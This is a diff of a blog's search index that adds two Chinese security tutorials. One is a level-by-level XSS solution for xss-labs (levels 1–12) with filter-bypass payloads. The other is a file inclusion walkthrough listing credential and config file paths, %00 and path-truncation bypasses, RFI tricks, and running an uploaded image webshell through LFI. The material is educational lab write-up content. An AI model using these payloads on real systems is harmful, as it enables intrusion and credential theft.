@@ -4,7 +4,7 @@
   
   
   <entry>
-    <title>测试文章</title>
+    <title>xss漏洞</title>
     <link href="/2022/04/22/xss%E6%BC%8F%E6%B4%9E/"/>
     <url>/2022/04/22/xss%E6%BC%8F%E6%B4%9E/</url>
     
@@ -17,11 +17,24 @@
   
   
   <entry>
-    <title>测试文章</title>
+    <title>xss-labs1-12关</title>
     <link href="/2022/04/22/xss-labs1-12%E5%85%B3/"/>
     <url>/2022/04/22/xss-labs1-12%E5%85%B3/</url>
     
     <content type="html"><![CDATA[<p>xss-lib<br>注：为防止不必要的麻烦，统一把&lt;&gt;替换成《&gt;<br>第一关：get请求的name变量放入xss poc,完整的返回在html中，浏览器响应xss poc。<br>level1.php?name&#x3D;《script&gt;alert(“xss”)《&#x2F;script&gt;<br>第二关：test”&gt;《script&gt;alert(“xss”)《&#x2F;script&gt;&#x2F;&#x2F; 完成闭合<br>第三关：查看源码对&gt;进行了过滤 ‘ onclick&#x3D;’alert(1)<br>第四关：同上 “onclick&#x3D;”alert(1)<br>第五关：尝试”onclick&#x3D;”alert(1)发现对on经行过滤<br>再尝试test”《script&gt;alert(“xss”)《&#x2F;script&gt;&#x2F;&#x2F; 发现对script进行过滤<br>但&gt;没进行过滤利用没有过滤尖括号，构造a标签再尝试利用a标签的href属性执行javascript<br>伪协议，”&gt;《a href&#x3D;’javascript:alert(1)’&gt;a《&#x2F;a&gt;&#x2F;&#x2F;,没有对javascript进行过滤，触发xss<br>第六关：”&gt;《a HrEf&#x3D;’javascript:alert(1)’&gt;a《&#x2F;a&gt;&#x2F;&#x2F;大小写绕过<br>第七关：test” &#x2F;&gt;《a hrhrefef&#x3D;”javascscriptript:alert(1)”&gt;a《&#x2F;a&gt;&#x2F;&#x2F; 重写绕过<br>第八关：把javascript:alert(1)进行编码绕过<br>第九关：采用第八关的poc，发现poc中应包含合法的url，poc中添加&#x2F;&#x2F;<a href="http://www.baidu.com,发现可以进行绕过/">http://www.baidu.com,发现可以进行绕过</a><br>第十关：.详细查看源代码，可能有隐藏的表单，尝试提交t_link、t_history、t_sort变量，t_sort变量返回在了html的value中，尝试进行了绕过。构造poc：”type&#x3D;”text” onclick&#x3D;”alert(1)”，web浏览器成功执行 。ps:type&#x3D;”text”为构造一个文本框，用来触发onclick事件<br>test&amp;t_sort&#x3D;”type&#x3D;”text” onclick&#x3D;”alert(1)”<br>第十一关：根据返回的html判断refer字段为web页面的自定义变量，可能存在xss注入点<br>修改refer “type&#x3D;”text” onclick&#x3D;”alert(1)”<br>第十二关：根据返回的html判断user-agent字段为web页面的自定义变量，可能存在xss注入点<br>修改user-agent “type&#x3D;”text” onclick&#x3D;”alert(1)”</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>文件包含漏洞</title>
+    <link href="/2022/04/22/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2022/04/22/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<p>一、什么是文件包含漏洞？</p><p>1、文件包含概述</p><p>和SQL注入等攻击方式一样，文件包含漏洞也是一种“注入型漏洞”，其本质就是输入一段用户能够控制的脚本或者代码，并让服务器端执行。</p><p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程就叫做包含。</p><p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p><p>以PHP为例，常用的文件包含函数有以下四种：</p><p>include()，require()，include_once()，require_once()</p><p>区别如下：</p><p>require()，找不到被包含的文件时会产生致命错误，并停止脚本运行。<br>include()，找不到被包含的文件时只会产生警告，脚本将继续运行。<br>include_once()与include()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。<br>require_once()与require()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。<br>二.本地文件包含漏洞<br>能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞（LFI）。<br>（1）使用绝对路径<br>使用绝对路径直接进行读取：<br>2）使用相对路径进行读取：<br>当前页面所在路径为C:\Apache24\htdocs\，我们需要使用…&#x2F;退到C盘再进行访问，构造路径如下：<br>…&#x2F;…&#x2F;windows&#x2F;system.ini<br>（3）一些常见的敏感信息路径：<br>Windows系统：<br>c:\boot.ini &#x2F;&#x2F; 查看系统版本<br>c:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F; IIS配置文件<br>c:\windows\repair\sam &#x2F;&#x2F; 存储Windows系统初次安装的密码<br>c:\ProgramFiles\mysql\my.ini &#x2F;&#x2F; MySQL配置<br>c:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F; MySQL root密码<br>c:\windows\php.ini &#x2F;&#x2F; php 配置信息<br>Linux&#x2F;Unix系统：<br>&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息<br>&#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2默认配置文件<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; 虚拟网站配置<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHP相关配置<br>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件<br>&#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql 配置文件<br>◆本地文件包含(LFI)<br>有限制本地文件包含漏洞绕过&gt;绕过方法<br>路径长度截断<br>·条件:1、Windows下要长于256字节，超出的部分会被丢弃<br>2、Linux下要长于4096字节，超出的部分会被丢弃。<br>192.168.152.143&#x2F;action2.php?action&#x3D;phpifo.php&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;<br>00截断<br>如果我们想通过文件包含漏洞读取本地敏感信息，就会遇到一些问题。因为服务器会给路径加上.&#x2F;site&#x2F;路径，以及.php后缀。<br>此时我们可以使用使用%00截断：<br>%00为结束符，在filename后带上%00，就可以截断末尾的.php。<br>当前路径为.&#x2F;site&#x2F;，如果要读取system.ini，则需要输入：…&#x2F;…&#x2F;…&#x2F;windows&#x2F;system.ini%00，<br>需要注意的是，%00截断需要php版本小于5.3.4，且关闭magic_quotes_gpc功能</p><p>2、配合文件上传使用<br>有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。<br>编辑一个图片马，找到上传点进行上传，文件保存的完整路径为：<br>C:\phpStudy\WWW\hackable\uploads\webshell.jpg<br>找到具有文件包含漏洞的页面 该页面用于读取C:\phpStudy\WWW\vulnerabilities\fi\路径中的文件 现在我们利用该页面去执行我们上传的图片马，路径需要从C:\phpStudy\WWW\vulnerabilities\fi\ 转到C:\phpStudy\WWW\hackable\uploads\webshell.jpg<br>192.168.211.151&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;..&#x2F;..&#x2F;hackable&#x2F;uploads&#x2F;webshell.jpg<br>使用webshell管理工具连接即可。</p><p>远程文件包含(RFI)<br>远程包含的意思<br>·指的是能够包含远程服务器上的文件并执行，可以通过http(s)或者ftp 等方式，远程加载文性。危害<br>·由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。包含条件<br>. allow_url_include&#x3D;On（默认为OFF，需要在php.ini中手动打开)- allow _url_fopen &#x3D; On（是否允许打开远程文件)<br>·用户可以动态控制变量</p><p>举例:<br>。[URL]?path&#x3D;<a href="http://ip/info.php//%E9%80%9A%E8%BF%87http%E5%8D%8F%E8%AE%AE%E5%8A%A0%E8%BD%BD%E7%9B%AE%E6%A0%87%E6%9C%BA%E4%B8%AD%E7%9A%84info.php%E6%96%87%E4%BB%B6">http://ip/info.php//通过http协议加载目标机中的info.php文件</a><br>·[URL]?path&#x3D;ftp:&#x2F;&#x2F;用户名:密码@ip&#x2F;info.php &#x2F;&#x2F;通过ftp协议加载目标机中的info.php文件<br>文件包含漏洞的利用<br>远程文件包含(RFI)<br>有限制远程文件包含漏洞绕过绕过方法<br>1.问号绕过</p><p>payload : ?action&#x3D;<a href="http://192.168.152.143/phpinfo.php">http://192.168.152.143/phpinfo.php</a>?<br>2.#号绕过</p><p>payload : ?action&#x3D;<a href="http://192.168.152.143/phpinfo.php%23">http://192.168.152.143/phpinfo.php%23</a><br>文件包含漏洞的利用<br>漏洞的利用<br>1、端口探测<br>. url&#x3D;dict&#x2F;&#x2F;ip:802<br>2.包含上传的getshell<br>·上传图片马，利用文件包含我们的图片马，菜刀连接<br>3、包含日志文件GetShell<br>·为了避免在web中进行了url编码，进行报错，把报错信息写进日志<br>4、远程文件包含写shell<br>‘);<br>?&gt;<br>·在文件夹下会看到生成shell.php.内容为，当直接包含图片时，代码就会被执行<br>5、使用PHP伪协议GetShell<br>php:&#x2F;&#x2F;filter<br>·用途:常用于读取文件&#x2F;源码<br>·使用条件:allow..url..fopen : off&#x2F;on<br>allow..url..include : off&#x2F;on两个配置都为off的情况下是可以正常使用的<br>·使用:[?path&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;文件.php]<br>·注意∶通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码。虽然不能直接获取到shell ,但能读取敏感文件。</p>]]></content>
     
     
     
